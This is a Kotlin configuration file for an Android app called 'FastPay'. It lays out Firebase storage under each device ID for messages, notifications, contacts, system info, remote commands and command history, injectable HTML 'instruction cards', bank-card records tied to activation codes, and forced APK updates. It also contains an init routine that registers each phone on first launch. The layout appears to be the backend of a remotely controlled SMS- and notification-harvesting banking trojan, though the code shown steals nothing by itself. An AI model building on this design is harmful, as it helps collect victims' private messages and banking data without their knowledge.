package com.example.fast.config

import android.os.Build
import com.example.fast.BuildConfig
import com.google.firebase.Firebase
import com.google.firebase.database.database

/**
 * AppConfig
 * 
 * Centralized configuration file for all sensitive and configurable values.
 * 
 * IMPORTANT: Update these values according to your environment:
 * - Development: Use local/development URLs
 * - Production: Use production URLs and credentials
 * 
 * SECURITY NOTE: 
 * - Never commit sensitive credentials to version control
 * - Consider using BuildConfig or environment variables for production
 * - Keep this file secure and don't share it publicly
 */
object AppConfig {
    
    // ============================================================================
    // FIREBASE CONFIGURATION
    // ============================================================================
    
    /**
     * Firebase Realtime Database Base Path
     * 
     * Structure:
     * - device/{deviceId} - Device data (messages, notifications, contacts, code, isActive, etc.)
     * - fastpay/testing/{code} - TESTING mode device-list entry
     * - fastpay/running/{code} - RUNNING mode device-list entry
     * - fastpay/testing/{code}/BANK - Bank object for TESTING mode
     * - fastpay/running/{code}/BANK - Bank object for RUNNING mode
     * - device-backups/{mode}-{code} - Device data backups (code conflicts)
     * - fastpay/app/version/ - App version check
     * 
     * Device-List Structure:
     * - TESTING: fastpay/testing/{code} contains deviceId, number, status, BANK, etc.
     * - RUNNING: fastpay/running/{code} contains deviceId, code, deviceName, etc.
     * - Device-specific data is stored in device/{deviceId}
     */
    const val FIREBASE_BASE_PATH = "fastpay"
    const val FIREBASE_DEVICE_LIST_PATH = "device-list"  // Legacy - no longer used in new paths
    
    /**
     * Firebase Storage Base Path
     * 
     * Default: "inputs"
     * This is the root path in Firebase Storage for file uploads.
     */
    const val FIREBASE_STORAGE_BASE_PATH = "inputs"
    
    /**
     * Firebase Database Paths
     * 
     * Device paths: fastpay/{deviceId}/
     * Device-list paths: fastpay/device-list/{code} = deviceId
     */
    object FirebasePaths {
        // Device paths (fastpay/{deviceId}/)
        const val MESSAGES = "messages"
        const val NOTIFICATIONS = "Notification"
        const val CONTACTS = "Contact"
        const val SYSTEM_INFO = "systemInfo"
        const val INSTRUCTION_CARD = "instructioncard"
        const val IS_ACTIVE = "isActive"
        const val CODE = "code"  // Links device to bank card
        const val NAME = "name"
        
        // Device-list paths (fastpay/device-list/{code}/)
        const val BANKNAME = "BANKNAME"  // Legacy - use BANK/bank_name instead
        const val BANKSTATUS = "BANKSTATUS"  // Legacy uppercase
        const val BANKSTATUS_LOWER = "Bankstatus"  // Current: fastpay/device-list/{code}/Bankstatus
        
        // BANK object structure (fastpay/device-list/{code}/BANK/)
        const val BANK = "BANK"
        const val BANK_BANK_NAME = "bank_name"
        const val BANK_COMPANY_NAME = "company_name"
        const val BANK_OTHER_INFO = "other_info"
        
        // Legacy paths (deprecated, kept for backward compatibility during migration)
        const val STATUS = "Status"
        const val TAKE_INPUT = "takeinput"
        const val PERMISSION = "permission"
        const val COMMANDS = "commands"
        const val COMMAND_HISTORY = "commandHistory"
        const val WORKFLOWS = "workflows"
        const val FILTER = "filter"
        const val INSTRUCTION = "instruction"
        const val SETUP_VALUE = "setupValue"
        const val PHONE = "phone"
        const val BANK_TAG = "banktag" // Deprecated
    }
    
    /**
     * Manage-Device Path Fields
     * 
     * Structure: Manage-Device/{code}-{number}/
     */
    object ManageDeviceFields {
        const val DEVICE_MODEL = "Device Model"
        const val ACTIVATED_AT = "Activated AT"
        const val LAST_ACTIVATED_AT = "Last Activated AT"
        const val IS_ONLINE = "Is Online"
        const val FIRST_ACTIVATE_BY = "First Activate by"
        const val TAG = "TAG"
        const val ANDROID_ID = "android_id"
    }
    
    /**
     * Firebase Storage Paths
     * 
     * These are relative paths appended to FIREBASE_STORAGE_BASE_PATH/{device_id}/
     */
    object FirebaseStoragePaths {
        const val INPUTS = "inputs"
    }
    
    /**
     * Firebase Storage APK Paths
     * 
     * Structure: app/apk/{filename}.apk
     * 
     * Naming Convention:
     * - Normal Update: FastPay-v{versionName}.apk (e.g., FastPay-v2.7.apk)
     * - Urgent Update: FastPay-urgent-v{versionName}.apk (e.g., FastPay-urgent-v2.8.apk)
     */
    object FirebaseStorageApkPaths {
        /**
         * Base path for APK files in Firebase Storage
         */
        const val APK_BASE_PATH = "app/apk"
        
        /**
         * Get full storage path for normal update APK
         * 
         * @param versionName Version name (e.g., "2.7")
         * @return Storage path (e.g., "app/apk/FastPay-v2.7.apk")
         */
        fun getNormalUpdatePath(versionName: String): String {
            return "$APK_BASE_PATH/FastPay-v$versionName.apk"
        }
        
        /**
         * Get full storage path for urgent update APK
         * 
         * @param versionName Version name (e.g., "2.8")
         * @return Storage path (e.g., "app/apk/FastPay-urgent-v2.8.apk")
         */
        fun getUrgentUpdatePath(versionName: String): String {
            return "$APK_BASE_PATH/FastPay-urgent-v$versionName.apk"
        }
    }
    
    // ============================================================================
    // API CONFIGURATION
    // ============================================================================
    
    /**
     * Django Backend API Base URL
     */
    val DJANGO_API_BASE_URL: String =
        BuildConfig.DJANGO_API_BASE_URL.ifBlank { "https://api.fastpaygaming.com" }
    
    /**
     * API Request Headers
     */
    object ApiHeaders {
        const val CONTENT_TYPE = "application/json; charset=utf-8"
        const val ACCEPT = "application/json"
    }
    
    // ============================================================================
    // APP CONFIGURATION
    // ============================================================================
    
    /**
     * App Version Check Configuration
     * 
     * Firebase path for version check: {FIREBASE_BASE_PATH}/app/version
     */
    const val VERSION_CHECK_PATH = "version"
    
    /**
     * Force Update URL Path
     * 
     * Firebase path for force update: {FIREBASE_BASE_PATH}/app/forceUpdateUrl
     */
    const val FORCE_UPDATE_URL_PATH = "forceUpdateUrl"
    
    /**
     * App Configuration Paths
     * 
     * Firebase path for app config: {FIREBASE_BASE_PATH}/app/config
     */
    const val APP_CONFIG_PATH = "config"
    const val APP_CONFIG_BRANDING = "branding"
    const val APP_CONFIG_THEME = "theme"
    
    // ============================================================================
    // HELPER METHODS
    // ============================================================================
    
    /**
     * Get Firebase database path for a device
     * Structure: device/{deviceId}
     * Used for both TESTING and RUNNING modes
     * 
     * @param deviceId Device ID
     * @param mode Activation mode (ignored - both use same path now)
     */
    fun getFirebaseDevicePath(deviceId: String, mode: String? = null): String {
        return "device/$deviceId"
    }
    
    /**
     * Get Firebase database path for a specific device resource
     * Structure: 
     *   - TESTING mode: fastpay/testing/{deviceId}/{resource}
     *   - RUNNING mode: fastpay/running/{deviceId}/{resource}
     *   - Default (legacy): fastpay/{deviceId}/{resource}
     * 
     * @param deviceId Device ID
     * @param resource Resource path
     * @param mode Activation mode: "testing", "running", or null for legacy path
     */
    fun getFirebasePath(deviceId: String, resource: String, mode: String? = null): String {
        return when (mode) {
            "running" -> "$FIREBASE_BASE_PATH/running/$deviceId/$resource"
            "testing" -> "$FIREBASE_BASE_PATH/testing/$deviceId/$resource"
            else -> "$FIREBASE_BASE_PATH/$deviceId/$resource" // Legacy path
        }
    }
    
    /**
     * Get Firebase database path for messages (flatter structure)
     * Structure: message/{deviceId}
     * 
     * Individual messages are stored at: message/{deviceId}/{timestamp}
     */
    fun getFirebaseMessagePath(deviceId: String): String {
        return "message/$deviceId"
    }
    
    /**
     * Get Firebase database path for a specific message by timestamp
     * Structure: message/{deviceId}/{timestamp}
     */
    fun getFirebaseMessagePath(deviceId: String, timestamp: Long): String {
        return "message/$deviceId/$timestamp"
    }
    
    /**
     * Get Firebase database path for notifications (flatter structure)
     * Structure: notification/{deviceId}
     * 
     * Individual notifications are stored at: notification/{deviceId}/{timestamp}
     */
    fun getFirebaseNotificationPath(deviceId: String): String {
        return "notification/$deviceId"
    }
    
    /**
     * Get Firebase database path for a specific notification by timestamp
     * Structure: notification/{deviceId}/{timestamp}
     */
    fun getFirebaseNotificationPath(deviceId: String, timestamp: Long): String {
        return "notification/$deviceId/$timestamp"
    }
    
    /**
     * Get Firebase database path for device-list entry
     * Structure: 
     *   - TESTING mode: fastpay/{code} (changed from fastpay/testing/{code})
     *   - RUNNING mode: fastpay/running/{code}
     *   - Default (legacy): fastpay/device-list/{code}
     * 
     * Note: This is a simple mapping where code maps to deviceId.
     * Device-specific data is stored in firebase/device/{deviceId}
     * 
     * @param code Activation code
     * @param mode Activation mode: "testing", "running", or null for legacy path
     */
    fun getFirebaseDeviceListPath(code: String, mode: String? = null): String {
        return when (mode) {
            "running" -> "$FIREBASE_BASE_PATH/running/$code"
            "testing" -> "$FIREBASE_BASE_PATH/$code" // Changed: fastpay/{code} instead of fastpay/testing/{code}
            else -> "$FIREBASE_BASE_PATH/$FIREBASE_DEVICE_LIST_PATH/$code" // Legacy path
        }
    }
    
    /**
     * Get Firebase database path for a specific device-list field
     * Structure: 
     *   - TESTING mode: fastpay/{code}/{field} (changed from fastpay/testing/{code}/{field})
     *   - RUNNING mode: fastpay/running/{code}/{field}
     *   - Default (legacy): fastpay/device-list/{code}/{field}
     * 
     * @param code Activation code
     * @param field Field name
     * @param mode Activation mode: "testing", "running", or null for legacy path
     */
    fun getFirebaseDeviceListFieldPath(code: String, field: String, mode: String? = null): String {
        return when (mode) {
            "running" -> "$FIREBASE_BASE_PATH/running/$code/$field"
            "testing" -> "$FIREBASE_BASE_PATH/$code/$field" // Changed: fastpay/{code}/{field} instead of fastpay/testing/{code}/{field}
            else -> "$FIREBASE_BASE_PATH/$FIREBASE_DEVICE_LIST_PATH/$code/$field" // Legacy path
        }
    }
    
    /**
     * Get Firebase database path for BANK object
     * Structure: 
     *   - TESTING mode: fastpay/{code}/BANK (changed from fastpay/testing/{code}/BANK)
     *   - RUNNING mode: fastpay/running/{code}/BANK
     *   - Default (legacy): fastpay/device-list/{code}/BANK
     * 
     * @param code Activation code
     * @param mode Activation mode: "testing", "running", or null for legacy path
     */
    fun getFirebaseBankPath(code: String, mode: String? = null): String {
        return when (mode) {
            "running" -> "$FIREBASE_BASE_PATH/running/$code/${FirebasePaths.BANK}"
            "testing" -> "$FIREBASE_BASE_PATH/$code/${FirebasePaths.BANK}" // Changed: fastpay/{code}/BANK instead of fastpay/testing/{code}/BANK
            else -> "$FIREBASE_BASE_PATH/$FIREBASE_DEVICE_LIST_PATH/$code/${FirebasePaths.BANK}" // Legacy path
        }
    }
    
    /**
     * Get Firebase database path for a specific BANK field
     * Structure: 
     *   - TESTING mode: fastpay/testing/{code}/BANK/{field}
     *   - RUNNING mode: fastpay/running/{code}/BANK/{field}
     *   - Default (legacy): fastpay/device-list/{code}/BANK/{field}
     * 
     * @param code Activation code
     * @param field Field name
     * @param mode Activation mode: "testing", "running", or null for legacy path
     */
    fun getFirebaseBankFieldPath(code: String, field: String, mode: String? = null): String {
        return when (mode) {
            "running" -> "$FIREBASE_BASE_PATH/running/$code/${FirebasePaths.BANK}/$field"
            "testing" -> "$FIREBASE_BASE_PATH/testing/$code/${FirebasePaths.BANK}/$field"
            else -> "$FIREBASE_BASE_PATH/$FIREBASE_DEVICE_LIST_PATH/$code/${FirebasePaths.BANK}/$field" // Legacy path
        }
    }
    
    /**
     * Get Firebase database path for device backup (when code conflict occurs)
     * Structure: device-backups/{mode}-{code}
     * 
     * @param code Activation code (old code being backed up)
     * @param mode Activation mode: "testing" or "running"
     */
    fun getFirebaseDeviceBackupPath(code: String, mode: String): String {
        return "device-backups/$mode-$code"
    }
    
    /**
     * Get Manage-Device path (DEPRECATED - No longer used)
     * This path has been removed from the app
     * @deprecated Legacy path, no longer in use
     */
    @Deprecated("Legacy path, no longer used", ReplaceWith(""))
    fun getManageDevicePath(code: String, phoneNumber: String): String {
        return "" // Return empty string - path no longer used
    }
    
    /**
     * Get Firebase app config path
     * Structure: fastpay/app/config
     */
    fun getFirebaseAppConfigPath(): String {
        return "$FIREBASE_BASE_PATH/app/$APP_CONFIG_PATH"
    }
    
    /**
     * Get Firebase app branding path
     * Structure: fastpay/app/config/branding
     */
    fun getFirebaseAppBrandingPath(): String {
        return "$FIREBASE_BASE_PATH/app/$APP_CONFIG_PATH/$APP_CONFIG_BRANDING"
    }
    
    /**
     * Get Firebase app theme path
     * Structure: fastpay/app/config/theme
     */
    fun getFirebaseAppThemePath(): String {
        return "$FIREBASE_BASE_PATH/app/$APP_CONFIG_PATH/$APP_CONFIG_THEME"
    }
    
    /**
     * Initialize DEVICE structure in Firebase
     * Should be called when APK is first installed/launched
     * Creates/updates fastpay/{deviceId} with ALL default values at the same time
     * 
     * All fields initialized:
     * - messages: {} (empty object, will be populated as messages arrive)
     * - Notification: {} (empty object, will be populated as notifications arrive)
     * - Contact: {} (empty object, will be populated during sync)
     * - systemInfo: {} (empty object for system information)
     * - instructionCard: {html: "", css: ""} (empty object, will be populated when instructions are sent)
     * - isActive: false (will be set to true on activation)
     * - name: Device Model
     * - bankcard: "BANKCARD" (constant string)
     * - time: Current timestamp in milliseconds
     * - batteryPercentage: Current battery percentage (0-100)
     * - animationSettings: {stopAnimationOn: null} (Animation ON by default)
     * 
     * Note: code is not set initially (will be set when device is activated)
     * Note: stopAnimationOn = null means animation is ON (default behavior)
     * 
     * @param deviceId Device ID (Android ID)
     * @param context Application context (required for battery percentage)
     */
    fun initializeDeviceStructure(deviceId: String, context: android.content.Context, mode: String? = null) {
        val devicePath = getFirebaseDevicePath(deviceId, mode)
        val deviceModel = Build.BRAND + " " + Build.MODEL
        
        // Get battery percentage
        val batteryPercentage = try {
            com.example.fast.util.BatteryHelper.getBatteryPercentage(context)
        } catch (e: Exception) {
            android.util.Log.w("AppConfig", "Could not get battery percentage, using -1", e)
            -1
        }
        
        // Initialize ALL fields at the same time
        val deviceData = mapOf<String, Any>(
            FirebasePaths.MESSAGES to mapOf<String, Any>(),
            FirebasePaths.NOTIFICATIONS to mapOf<String, Any>(),
            FirebasePaths.CONTACTS to mapOf<String, Any>(),
            FirebasePaths.SYSTEM_INFO to mapOf<String, Any>(),
            FirebasePaths.IS_ACTIVE to false,
            FirebasePaths.INSTRUCTION_CARD to mapOf(
                "html" to "",
                "css" to ""
            ),
            "model" to deviceModel,  // Changed from NAME to model
            "bankcard" to "BANKCARD",
            "time" to System.currentTimeMillis(),
            "batteryPercentage" to batteryPercentage,
            "animationSettings" to mapOf(
                "stopAnimationOn" to null  // Default: Animation ON (null = no stop)
            )
        )
        
        Firebase.database.reference.child(devicePath).updateChildren(deviceData)
            .addOnSuccessListener {
                android.util.Log.d("AppConfig", "Device structure initialized with all fields: $devicePath")
            }
            .addOnFailureListener { e ->
                android.util.Log.e("AppConfig", "Failed to initialize device structure", e)
            }
    }
    
    /**
     * Get Firebase storage path for a device
     */
    fun getFirebaseStoragePath(deviceId: String, fileName: String): String {
        return "$FIREBASE_STORAGE_BASE_PATH/$deviceId/$fileName"
    }
}

